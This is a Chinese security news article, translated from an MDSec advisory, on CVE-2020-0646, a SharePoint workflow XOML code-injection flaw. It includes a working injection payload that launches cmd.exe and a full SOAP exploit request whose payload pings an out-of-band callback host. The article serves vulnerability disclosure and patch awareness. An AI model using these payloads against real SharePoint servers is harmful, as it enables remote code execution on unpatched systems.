![](https://image.3001.net/images/20200208/1581109934_5e3dd2ae92055.png!small)

## 漏洞描述

 **2019年11月份，安全研究人员在微软SharePoint
Online的工作流中发现了一个代码注入漏洞，并将其上报给微软公司。攻击者一旦成功利用该漏洞，将能够在目标系统中实现远程代码执行。微软在获取到漏洞信息之后，第一时间修复了在线平台上的相关漏洞，但是却到2020年的1月份才修复.NET
Framework中的相关问题。因此，如果你的SharePoint On-Rremise版本没有安装2020年1月份的.NET补丁，那你将仍然会受到该漏洞的影响。**

需要注意的是，如果你的IIS配置支持.XOML扩展，那么在文件上传时你同样有可能受到该漏洞的影响。

## CVE-2020-0646漏洞分析

在编译XOML格式文件时，攻击者可以利用System.Workflow.Activities命名空间中的某些参数来在SharePoint服务器上执行任意代码。正是因为攻击者能够执行任意代码，因此该漏洞也能被用来绕过Workflow编译器的nocode选项。

下面的XOML文件显示的是一个使用[
_CallExternalMethodActivity_](https://docs.microsoft.com/en-us/dotnet/api/system.workflow.activities.callexternalmethodactivity)类的样例：

    
    
    <SequentialWorkflowActivity x:Class="MyWorkflow" x:Name="foobar" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" xmlns="http://schemas.microsoft.com/winfx/2006/xaml/workflow">  <CallExternalMethodActivity x:Name="codeActivity1" MethodName='test1' InterfaceType='System.String);}Object/**/test2=System.Diagnostics.Process.Start("cmd.exe","/c calc");private/**/void/**/foobar(){//' /></SequentialWorkflowActivity>

在编译过程中，攻击者可以将InterfaceType属性的值注入到刚刚生成的C#临时文件中：

    
    
    …    private void InitializeComponent()    {        …        this.codeActivity1.InterfaceType = typeof(System.String);}Object/**/test2=System.Diagnostics.Process.Start("cmd.exe","/c calc");private/**/void/**/foobar(){//);              …    }…

完成上述操作之后，攻击者就可以绕过原函数并尝试实现任意代码执行了。值得一提的是，在上述例子中，当InterfaceType属性受到影响时，其他String类型的属性（例如MethodName）已正确验证或转义。

除此之外，CodeActivity类中的ExecuteCode参数同样会受这种利用方式的影响，但是我们无法在SharePoint的在线版本中针对该参数进行利用和攻击，只能适用于On-Premise版本。当然了，这里很可能还有其他的Activity类会受到潜在影响。

比如说，在下面的例子中，攻击者使用了如下HTTP请求在SharePoint Online版本上执行了任意代码：

    
    
    POST http://[REDACTED].sharepoint.com/_vti_bin/webpartpages.asmx HTTP/1.1Date: Tue, 29 Oct 2019 14:26:21 GMTMIME-Version: 1.0Accept: */*SOAPAction: http://microsoft.com/sharepoint/webpartpages/ValidateWorkflowMarkupAndCreateSupportObjectsUser-Agent: Mozilla/4.0 (compatible; MS FrontPage 15.0)Host: [REDACTED].sharepoint.comAccept-Language: en-us, en;q=0.1Accept: auth/sicilyX-FORMS_BASED_AUTH_ACCEPTED: TContent-Type: text/xml; charset=utf-8X-Vermeer-Content-Type: text/xml; charset=utf-8Accept-encoding: gzip, deflateConnection: Keep-AlivePragma: no-cacheContent-Length: 1031Cookie: [REDACTED]<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><ValidateWorkflowMarkupAndCreateSupportObjects xmlns="http://microsoft.com/sharepoint/webpartpages"><workflowMarkupText><![CDATA[<SequentialWorkflowActivity x:Class="MyWorkflow" x:Name="foobar" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"                            xmlns="http://schemas.microsoft.com/winfx/2006/xaml/workflow">  <CallExternalMethodActivity x:Name="foo" MethodName='test1' InterfaceType='System.String);}Object/**/test2=System.Diagnostics.Process.Start("cmd.exe","/c ping o9ydzn3p7ed579lepxolocqyqpwik7.[redactedBurpCollabServer]");private/**/void/**/foobar(){//' /></SequentialWorkflowActivity>]]></workflowMarkupText><rulesText></rulesText><configBlob></configBlob><flag>2</flag></ValidateWorkflowMarkupAndCreateSupportObjects></soap:Body></soap:Envelope>

攻击完成之后，我们就可以查看到主机需要解析的对应DNS名称了：

![](https://image.3001.net/images/20200208/1581109959_5e3dd2c77623f.png!small)

除此之外，攻击者同样可以利用上述请求来利用On-Premise版本中的漏洞并实施攻击。

## 后话

安装了漏洞CVE-2020-0646的补丁之后，SharePoint的工作流将会检查所有的XML元素及属性，以确保它们只包含有限数量的合法字符。因此，当使用所选的nocode选项时，攻击者将无法在默认配置中向生成的C#代码注入任意代码了。

## 参考资料

> 1、[ _https://www.nccgroup.trust/uk/our-research/technical-advisory-> bypassing-workflows-protection-mechanisms-remote-code-execution-on-> sharepoint/_](https://www.nccgroup.trust/uk/our-research/technical-advisory-> bypassing-workflows-protection-mechanisms-remote-code-execution-on-> sharepoint/)
>
> 2、[ _https://www.nccgroup.trust/uk/our-research/technical-advisory-> bypassing-microsoft-xoml-workflows-protection-mechanisms-using-> deserialisation-of-untrusted-data/_](https://www.nccgroup.trust/uk/our-> research/technical-advisory-bypassing-microsoft-xoml-workflows-protection-> mechanisms-using-deserialisation-of-untrusted-data/)

 *** 参考来源：[ _mdsec_](https://www.mdsec.co.uk/2020/01/code-injection-in-workflows-leading-to-sharepoint-rce-cve-2020-0646/)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

